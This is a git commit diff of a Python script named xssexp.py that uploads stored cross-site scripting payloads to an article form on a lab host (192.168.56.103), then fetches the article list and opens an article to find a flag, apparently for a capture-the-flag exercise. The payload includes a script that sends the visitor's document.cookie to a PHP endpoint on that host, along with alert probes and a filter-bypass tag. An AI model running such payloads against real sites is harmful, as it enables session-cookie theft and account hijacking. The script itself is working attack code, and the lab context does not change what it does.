be9403aea12c8ba953ae6c892846d10a41d58191
dangyuyan <74172793+dangyuyan@users.noreply.github.com>
2023-07-28 10:28:24 +0800

    Update xssexp.py

--- bug_script/xssexp.py
+++ bug_script/xssexp.py
@@ -2,6 +2,7 @@ import requests
 import urllib.parse
 import bs4
 #上传payload
+
 payload='''<img src=x onerror=alert(1)>
 <script>alert(2)</script>
 <script>window.open(\'http://192.168.56.103:8000/test.php?cookie=\'+document.cookie)</script>
@@ -9,8 +10,8 @@ payload='''<img src=x onerror=alert(1)>
 <Sscriptcript>alert(5)</Sscriptcript>'''
 url='http://192.168.56.103:8000/new_article.php'
 headers={
-    'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.183',
-    'cookie':'pma_lang=zh_CN; PHPSESSID=14a63efcc4a85fef312a6a708a71abd8',
+    'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
+    'cookie':'pma_lang=zh_CN; PHPSESSID=48d7f4ec1e96aac4e91b352e32d95b0b;',
     'content-type':'application/x-www-form-urlencoded'
 }
 data=f'title=111&content={urllib.parse.quote(payload)}'
@@ -20,7 +21,7 @@ if response.status_code != 200:
     exit()
 
 #获取文章列表
-url='http://192.168.56.103:80/article_list.php'
+url='http://192.168.56.103:8000/article_list.php'
 response=requests.get(url=url,headers=headers)
 if response.status_code != 200:
     print('web error!')
@@ -28,12 +29,12 @@ if response.status_code != 200:
 soup=bs4.BeautifulSoup(response.text,features="html.parser")
 #print(soup.text)
 if '查看' not in soup.text:
-    print('上传失败！文章列表为空')
+    print('上传失败，文章列表为空')
     exit()
 else:
     href=soup.find('table').find_all('tr')[2].find_all('td')[2].find_all('a')[0]['href']
 
-    href='http://192.168.56.103:80/'+href
+    href='http://192.168.56.103:8000/'+href
     #查看文章找到flag
     response=requests.get(url=href,headers=headers)
     if response.status_code != 200:
